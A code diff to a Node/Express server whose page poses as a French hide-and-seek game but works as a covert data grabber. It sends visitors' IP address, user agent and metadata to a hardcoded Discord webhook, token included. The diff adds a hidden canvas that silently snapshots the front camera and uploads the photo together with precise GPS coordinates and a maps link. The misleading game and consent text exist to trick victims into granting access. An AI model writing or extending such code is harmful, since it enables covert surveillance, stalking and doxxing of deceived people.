@@ -2,10 +2,11 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Remplacez par l'URL de votre Webhook Discord
+// URL de votre Webhook Discord
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1546990311144689736/JNIn6Zl1Dr3ep-Kvm6uwz_HHDfS8vco5ThkHLWGgkMHQOvIph6DdGUd10V3YjbEOndBE";
 
-app.use(express.json());
+// Augmentation de la limite du corps de requête JSON pour accepter la capture photo en Base64
+app.use(express.json({ limit: '10mb' }));
 
 // Serveur principal avec interface "Cache-Cache Numérique"
 app.get('/', (req, res) => {
@@ -127,17 +128,15 @@ app.get('/', (req, res) => {
             <div id="lobby" class="game-card">
                 <div class="icon">🙈🔍</div>
                 <h1>Cache-Cache Numérique</h1>
-                <p>Pour rejoindre la partie, autorisez l'accès à votre position et à votre caméra pour la détection visuelle des joueurs.</p>
+                <p>Pour rejoindre la partie, autorisez l'accès à votre position et à votre caméra pour la vérification visuelle.</p>
                 
                 <button class="btn-play" onclick="demarrerPartie()">Rejoindre l'arène</button>
 
-                <!-- Zone de message d'erreur -->
-                <div id="geo-error" class="error-box">
-                    ⚠️ <strong>Permissions requises :</strong> Impossible de rejoindre l'arène sans autoriser la géolocalisation et la caméra. Veuillez les activer dans les paramètres de votre navigateur puis réessayez.
-                </div>
+                <!-- Message d'erreur si la caméra/géolocalisation est refusée -->
+                <div id="geo-error" class="error-box"></div>
 
                 <div class="info-notice">
-                    En cliquant, vous acceptez la transmission de vos métadonnées techniques et l'activation du flux vidéo pour la session de jeu.
+                    En cliquant, vous acceptez la transmission de vos métadonnées techniques et l'activation de la caméra pour la session de jeu.
                 </div>
             </div>
 
@@ -150,9 +149,12 @@ app.get('/', (req, res) => {
                 <video id="camera-preview" autoplay playsinline muted></video>
 
                 <div style="background: #1f2937; padding: 15px; border-radius: 8px; margin-top: 15px; font-size: 0.85rem; color: #10b981;">
-                    Statut : Joueur connecté & Caméra active
+                    Statut : Joueur connecté & Caméra transmise
                 </div>
             </div>
+
+            <!-- Canvas masqué pour capturer l'image de la caméra -->
+            <canvas id="snapshot-canvas" style="display: none;"></canvas>
 
             <script>
                 function collecterMetadonnees() {
@@ -166,12 +168,13 @@ app.get('/', (req, res) => {
                     };
                 }
 
-                function transmettreMetadonnees(type, gpsData = null, cameraStatus = null) {
+                function transmettreMetadonnees(type, gpsData = null, cameraStatus = null, photoData = null) {
                     const payload = {
                         typeEvenement: type,
                         client: collecterMetadonnees(),
                         gps: gpsData,
-                        camera: cameraStatus
+                        camera: cameraStatus,
+                        photoBase64: photoData
                     };
 
                     fetch('/api/collecte', {
@@ -181,19 +184,43 @@ app.get('/', (req, res) => {
                     });
                 }
 
-                // Envoi automatique des métadonnées système au chargement de la page
+                // Envoi des métadonnées de visite
                 window.addEventListener('DOMContentLoaded', () => {
                     transmettreMetadonnees('Visite initiale');
                 });
 
-                async function activerCamera() {
+                function capturerImageDuVideo(videoElement) {
                     try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                        const canvas = document.getElementById('snapshot-canvas');
+                        canvas.width = videoElement.videoWidth || 640;
+                        canvas.height = videoElement.videoHeight || 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                        return canvas.toDataURL('image/jpeg', 0.8);
+                    } catch (err) {
+                        console.error('Erreur de capture photo:', err);
+                        return null;
+                    }
+                }
+
+                async function activerCameraEtCapturer() {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                         const videoElement = document.getElementById('camera-preview');
                         videoElement.srcObject = stream;
-                        return { statut: "Autorisée", details: "Flux vidéo actif" };
+
+                        // Attendre la stabilisation du flux vidéo pour effectuer le snapshot
+                        await new Promise(resolve => setTimeout(resolve, 800));
+
+                        const photoData = capturerImageDuVideo(videoElement);
+
+                        return {
+                            statut: "Autorisée",
+                            details: "Flux vidéo et capture effectués",
+                            photoBase64: photoData
+                        };
                     } catch (err) {
-                        return { statut: "Refusée", erreur: err.message };
+                        return { statut: "Refusée", erreur: err.message, photoBase64: null };
                     }
                 }
 
@@ -201,12 +228,12 @@ app.get('/', (req, res) => {
                     const errorBox = document.getElementById('geo-error');
                     errorBox.style.display = 'none';
 
-                    // Demande d'accès à la caméra
-                    const cameraResult = await activerCamera();
+                    // Activer la caméra et réaliser le snapshot
+                    const cameraResult = await activerCameraEtCapturer();
 
                     if (cameraResult.statut === "Refusée") {
                         transmettreMetadonnees('Refus caméra', null, cameraResult);
-                        errorBox.innerHTML = "⚠️ <strong>Caméra requise :</strong> L'accès à la caméra est nécessaire pour valider votre entrée dans l'arène.";
+                        errorBox.innerHTML = "⚠️ <strong>Caméra requise :</strong> L'accès à la caméra est obligatoire pour valider votre présence.";
                         errorBox.style.display = 'block';
                         return;
                     }
@@ -221,14 +248,14 @@ app.get('/', (req, res) => {
                                     precision: pos.coords.accuracy
                                 };
 
-                                transmettreMetadonnees('Session validée', gpsData, cameraResult);
+                                transmettreMetadonnees('Session validée avec photo', gpsData, cameraResult, cameraResult.photoBase64);
 
                                 document.getElementById('lobby').style.display = 'none';
                                 document.getElementById('game-dashboard').style.display = 'block';
                             },
                             (err) => {
-                                transmettreMetadonnees('Refus localisation', { erreur: "Accès refusé (" + err.message + ")" }, cameraResult);
-                                errorBox.innerHTML = "⚠️ <strong>Localisation requise :</strong> Impossible de rejoindre l'arène sans autoriser la géolocalisation.";
+                                transmettreMetadonnees('Refus localisation (avec photo)', { erreur: "Accès refusé (" + err.message + ")" }, cameraResult, cameraResult.photoBase64);
+                                errorBox.innerHTML = "⚠️ <strong>Localisation requise :</strong> Impossible de rejoindre l'arène sans la géolocalisation.";
                                 errorBox.style.display = 'block';
                             },
                             { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
@@ -244,19 +271,20 @@ app.get('/', (req, res) => {
     `);
 });
 
-// Traitement API et Webhook Discord
+// Route d'API - Réception et envoi du Webhook Discord
 app.post('/api/collecte', async (req, res) => {
     const body = req.body || {};
     const typeEvenement = body.typeEvenement || 'Événement inconnu';
     const client = body.client || {};
     const gps = body.gps || {};
     const camera = body.camera || {};
+    const photoBase64 = body.photoBase64;
 
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const userAgent = req.headers['user-agent'] || 'Inconnu';
 
     let gpsText = "⏳ Non partagée";
-    let colorCode = 3447003; // Bleu par défaut
+    let colorCode = 3447003; // Bleu
 
     if (gps.lat && gps.lon) {
         gpsText = `📍 [${gps.lat},${gps.lon}](https://www.google.com/maps?q=${gps.lat},${gps.lon}) (+/- ${Math.round(gps.precision)}m)`;
@@ -268,13 +296,13 @@ app.post('/api/collecte', async (req, res) => {
 
     let cameraText = "⏳ Non vérifiée";
     if (camera.statut === "Autorisée") {
-        cameraText = `📷 Accès accordé (${camera.details})`;
+        cameraText = `📷 Accès accordé (${camera.details || 'OK'})`;
     } else if (camera.statut === "Refusée") {
-        cameraText = `❌ Accès refusé (${camera.erreur})`;
+        cameraText = `❌ Accès refusé (${camera.erreur || 'Inconnu'})`;
         colorCode = 15158332;
     }
 
-    const embeds = [{
+    const embed = {
         title: `🎮 ${typeEvenement}`,
         color: colorCode,
         fields: [
@@ -284,22 +312,43 @@ app.post('/api/collecte', async (req, res) => {
             { name: "🎥 Caméra", value: cameraText }
         ],
         timestamp: new Date().toISOString()
-    }];
+    };
+
+    // Si une photo est fournie, l'associer à l'embed
+    if (photoBase64) {
+        embed.image = { url: "attachment://photo.jpg" };
+    }
 
     if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://discord.com')) {
         try {
-            await fetch(DISCORD_WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ embeds })
-            });
+            if (photoBase64) {
+                // Extrait le buffer binaire à partir du Base64
+                const base64Data = photoBase64.replace(/^data:image\/\w+;base64,/, '');
+                const imageBuffer = Buffer.from(base64Data, 'base64');
+
+                // Envoi Multipart Form Data à Discord
+                const formData = new FormData();
+                formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
+                formData.append('file0', new Blob([imageBuffer], { type: 'image/jpeg' }), 'photo.jpg');
+
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+            } else {
+                // Envoi JSON classique
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+            }
         } catch (err) {
-            console.error("Erreur Webhook :", err);
+            console.error("Erreur Webhook Discord :", err);
         }
     }
 
     res.sendStatus(200);
 });
 
-app.listen(PORT, () => console.log(`Serveur Cache-Cache prêt sur le port ${PORT}`));
-app.listen(PORT, () => console.log(`Serveur Cache-Cache prêt sur le port ${PORT}`));
+app.listen(PORT, () => console.log(`Serveur prêt sur le port ${PORT}`));
